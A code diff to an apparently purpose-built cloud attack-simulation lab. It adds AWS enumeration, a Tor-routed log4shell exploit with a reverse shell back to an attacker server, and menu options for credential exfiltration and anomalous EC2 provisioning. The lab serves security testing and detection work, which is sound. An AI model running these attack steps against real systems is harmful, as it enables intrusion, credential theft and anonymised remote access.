@@ -12,7 +12,7 @@ class ScenarioExecution:
     def __init__(self):
         pass
 
-    def execute(self):
+    def execute(self, manual):
         print("-"*30)
         print(colored("Executing Scenario 1 : Exploit Vulnerable Application, EC2 takeover, Credential Exfiltration & Anomalous Compute Provisioning ", color="red"))
         self.generate_ssh_key()
@@ -40,25 +40,32 @@ class ScenarioExecution:
         print("-"*30)
         print(colored("Export Meta Data of Infra", color="red"))
 
-        print("-"*30)
-        print(colored("Get into the attacker machine - Tor Node", color="red"))
-        self.loading_animation()
+        if manual is True:
+            print(colored("Lab environment ready, use --post-launch for further attacks"))
+            return
+        else:
+            print("-"*30)
+            print(colored("Get into the attacker machine - Tor Node", color="red"))
+            self.loading_animation()
 
-        self.get_data()
-        self.execute_exploit()
-        self.ec2_takeover()
-        self.exfiltrate_credentials()
-        self.anomalous_infra_rollout()
+            self.get_data()
+            self.execute_exploit()
+            self.aws_cloud_enumeration()
+            self.ec2_takeover()
+            self.exfiltrate_credentials()
+            self.anomalous_infra_rollout()
+            self.reverse_shell()
 
-        print("-"*30)
-        print(colored("Generating Report", color="red"))
-        self.loading_animation()
-        self.generate_report()
+            print("-"*30)
+            print(colored("Generating Report", color="red"))
+            self.loading_animation()
+            self.generate_report()
 
     def generate_ssh_key(self):
         generate_ssh_key()
 
     def loading_animation(self):
+        
         loading_animation()
 
     def remove_file(self):
@@ -113,6 +120,12 @@ class ScenarioExecution:
         self.loading_animation()
         subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+self.ATTACKER_SERVER_PUBLIC_IP+" 'aws sts get-caller-identity'", shell=True)
 
+    def aws_cloud_enumeration(self):
+        print("-"*30)
+        print(colored("Enumerating AWS Cloud environment", color="red"))
+        self.loading_animation()
+        subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+self.ATTACKER_SERVER_PUBLIC_IP+" 'pip3 install -r /cloud-service-enum-master/aws_service_enum/requirements.txt && pip3 install awsebcli --upgrade && pip3 install --upgrade awscli && python3 /cloud-service-enum-master/aws_service_enum/aws_enum_services.py'", shell=True)
+
     def anomalous_infra_rollout(self):
         print("-"*30)
         print(colored("Anomalous Infra Rollout", color="red"))
@@ -133,6 +146,13 @@ class ScenarioExecution:
             print(f"Command failed with error: {e}")
 
         subprocess.run(f"pulumi -C scenarios/scenario_1/infra/ import aws:ec2/instance:Instance {self.INSTANCE_NAME.strip()} {instance_id.strip()} --protect=false --yes --stack=cobra-scenario-1 --suppress-outputs --suppress-progress > /dev/null 2>&1", shell=True)
+    
+    def reverse_shell(self):
+        print("-"*30)
+        print(colored("Exploiting log4shell application and perform reverse-shell", color="red"))
+        self.loading_animation()
+        subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+self.ATTACKER_SERVER_PUBLIC_IP+" 'sudo python3 torghost/torghost.py -s && bash exploit.sh "+self.WEB_SERVER_PUBLIC_IP+":8081 "+self.ATTACKER_SERVER_PUBLIC_IP+"'", shell=True)
+
 
     def generate_report(self):
         gen_report(self.ATTACKER_SERVER_INSTANCE_ID, self.ATTACKER_SERVER_PUBLIC_IP, self.WEB_SERVER_PUBLIC_IP, self.WEB_SERVER_INSTANCE_ID)
@@ -145,12 +165,14 @@ class ScenarioExecution:
         print(colored("3. SSH inside Victim Webserver", color="green"))
         print(colored("4. SSH inside Attacker Server", color="green"))
         print(colored("5. Execute RCE web attack", color="green"))
-        print(colored("6. Perform anomalous compute provision", color="green"))
-        print(colored("7. Exit", color="green"))
+        print(colored("6. Perform AWS Cloud enumeration using exploited app credential", color="green"))
+        print(colored("7. Perform anomalous compute provision", color="green"))
+        print(colored("8. Perform log4shell exploit and Reverse Shell ", color="green"))
+        print(colored("9. Exit", color="green"))
         while True:
             try:
                 choice = int(input(colored("Enter your choice: ", color="yellow")))
-                if choice not in [1, 2, 3, 4, 5, 6]:
+                if choice not in [1, 2, 3, 4, 5, 6, 7, 8, 9]:
                     raise ValueError(colored("Invalid choice. Please enter 1, 2, 3, 4, 6 or 5.", color="red"))
                 if choice == 1:
                     source_file = input(colored("Enter file path: ", color="yellow"))
@@ -174,10 +196,18 @@ class ScenarioExecution:
                     self.exfiltrate_credentials()
                     return
                 elif choice == 6:
+                    self.aws_cloud_enumeration()
+                    return
+                elif choice == 7:
                     self.execute_exploit()
                     self.ec2_takeover()
                     self.exfiltrate_credentials()
                     self.anomalous_infra_rollout()
+                    return
+                elif choice == 8:
+                    self.reverse_shell()
+                    return
+                elif choice == 9:
                     return
             except ValueError as e:
                 print(e)
